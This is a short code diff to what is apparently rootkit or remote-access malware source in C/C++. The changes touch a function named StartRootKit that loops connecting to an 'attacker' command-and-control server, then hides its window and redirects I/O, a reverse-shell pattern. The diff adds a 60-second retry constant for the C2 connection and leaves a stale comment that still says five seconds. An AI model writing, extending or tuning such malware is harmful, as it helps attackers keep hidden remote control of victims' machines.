@@ -41,6 +41,7 @@ const int STARTUP_DELAY = 60000;
 const int HIDDEN_DELAY = 60000;
 const int NOT_HIDDEN_DELAY = 60000;
 const int LAUNCH_HIDDEN_COPY = 60000;
+const int RETRY_CONNECTING_TO_C2 = 60000;
 // ===== END CONFIGURATION =====
 
 // Generate the full executable name
@@ -126,7 +127,7 @@ void StartRootKit() {
 
     // Connect to attacker (with retry logic)
     while (connect(sock, (SOCKADDR*)&addr, sizeof(addr))) {
-        Sleep(5000);  // Retry every 5 seconds
+        Sleep(RETRY_CONNECTING_TO_C2);  // Retry every 5 seconds
     }
 
     // Hide window and redirect I/O
